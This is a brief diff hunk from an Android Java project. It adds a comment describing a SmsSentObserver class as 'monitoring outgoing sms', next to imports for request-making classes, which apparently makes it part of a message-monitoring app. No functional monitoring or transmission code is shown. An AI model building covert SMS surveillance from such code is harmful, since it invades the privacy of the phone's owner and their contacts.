@@ -16,7 +16,12 @@ import com.inet.android.request.DataRequest;
 import com.inet.android.request.RequestMakerImpl;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-
+/**
+ * SmsSentObserver class is design for monitoring outgoing sms
+ * 
+ * @author johny homicide
+ * 
+ */
 public class SmsSentObserver extends ContentObserver {
 
 	private static final String TAG = "SMSTSentObserver";
